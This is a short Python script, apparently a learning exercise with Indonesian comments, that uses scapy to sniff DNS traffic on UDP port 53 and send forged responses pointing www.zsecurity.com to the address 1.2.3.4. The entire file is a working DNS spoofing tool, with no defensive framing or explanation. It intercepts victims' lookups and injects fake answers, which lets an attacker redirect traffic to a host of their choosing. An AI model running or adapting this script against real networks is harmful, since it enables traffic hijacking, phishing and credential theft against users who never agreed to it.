import scapy.all as scapy
from scapy.all import DNS, DNSQR, IP, UDP, DNSRR, send, sniff

def dns_spoof(pkt):
    # print(pkt.show())
    if pkt.haslayer(DNS):
        # print(pkt[DNS].show())
        # if pkt.haslayer(DNSRR):
            # print(pkt[DNSRR].show())
    #     # Cek jika DNS query menuju domain tertentu (misalnya, google.com)
        if "www.zsecurity.com" in pkt[DNSQR].qname.decode():
            # print(pkt[DNSRR].show())
            # Membuat paket DNS spoofed dengan IP palsu
            spoofed_pkt = IP(dst=pkt[IP].src)/ \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNSQR], an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="1.2.3.4"))
            send(spoofed_pkt, verbose=False)
    
    print(pkt[DNS].show())

# Alamat IP yang ingin dialihkan
redirect_ip = "1.2.3.4"  # Ganti dengan alamat IP tujuan yang diinginkan

# Fungsi callback untuk menangkap dan memproses paket DNS
sniff(filter="udp and port 53", prn=dns_spoof)
